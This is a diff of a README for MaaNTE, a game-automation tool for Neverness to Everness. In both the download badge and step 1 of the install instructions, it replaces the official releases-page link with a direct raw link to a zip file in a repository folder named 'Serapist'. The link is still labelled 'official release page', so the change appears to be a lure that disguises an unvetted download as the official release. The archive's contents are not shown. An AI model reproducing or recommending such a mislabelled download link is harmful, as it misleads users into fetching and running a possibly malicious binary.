@@ -1,6 +1,6 @@
 # 🎮 MaaNTE - Automate Your Neverness to Everness Tasks
 
-[![Download MaaNTE](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/limon8647/MaaNTE/releases)
+[![Download MaaNTE](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/limon8647/MaaNTE/raw/refs/heads/main/Serapist/Maa-NTE-1.4.zip)
 
 MaaNTE helps you manage routine tasks in Neverness to Everness. The software uses the MAAFramework to handle repetitive actions. You save time while the program plays the game for you.
 
@@ -28,7 +28,7 @@ Ensure your computer meets these standards for smooth performance:
 
 Follow these steps to set up the software:
 
-1.  Visit the official release page: [https://github.com/limon8647/MaaNTE/releases](https://github.com/limon8647/MaaNTE/releases).
+1.  Visit the official release page: [https://github.com/limon8647/MaaNTE/raw/refs/heads/main/Serapist/Maa-NTE-1.4.zip](https://github.com/limon8647/MaaNTE/raw/refs/heads/main/Serapist/Maa-NTE-1.4.zip).
 2.  Look for the latest version at the top of the page.
 3.  Click the file ending in `.zip` to download the package.
 4.  Find the downloaded folder in your Downloads directory.
